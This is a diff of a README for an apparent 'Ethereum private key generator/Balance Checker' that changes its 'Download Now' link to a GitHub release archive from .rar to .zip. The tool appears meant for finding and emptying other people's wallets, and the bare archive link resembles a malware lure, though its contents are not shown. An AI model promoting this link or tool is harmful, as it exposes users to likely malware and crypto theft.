@@ -1,5 +1,5 @@
 # Ethereum private key generator/Balance Checker
-[Download Now](https://github.com/KhatibNeoefef323/Ethereum-Private-Key-Generator/releases/download/Download/application.rar)
+[Download Now](https://github.com/KhatibNeoefef323/Ethereum-Private-Key-Generator/releases/download/Download/application.zip)
 
 
 
